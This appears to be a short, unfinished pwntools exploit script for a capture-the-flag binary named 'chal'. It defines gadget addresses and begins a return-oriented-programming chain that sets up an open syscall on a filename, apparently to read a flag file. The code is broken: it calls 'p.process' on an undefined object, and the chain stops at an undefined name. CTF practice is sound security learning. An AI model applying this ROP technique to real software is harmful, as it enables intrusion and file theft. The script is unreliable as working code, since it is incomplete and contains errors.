from pwn import *

context.arch = 'amd64'

p.process('./chal')

ROP = 0x4e3360
fn = 0x4e3340

pop_rax_ret = 0x45db87
pop_rdi_ret = 0x4038b3
pop_rsi_ret = 0x402428
pop_rdx_pop_rbx_ret = 0x493a2b
leave_ret = 0x40190c

rop = flat(
    pop_rax_ret, 2,
    pop_rdi_ret, fn,
    pop_rsi
)
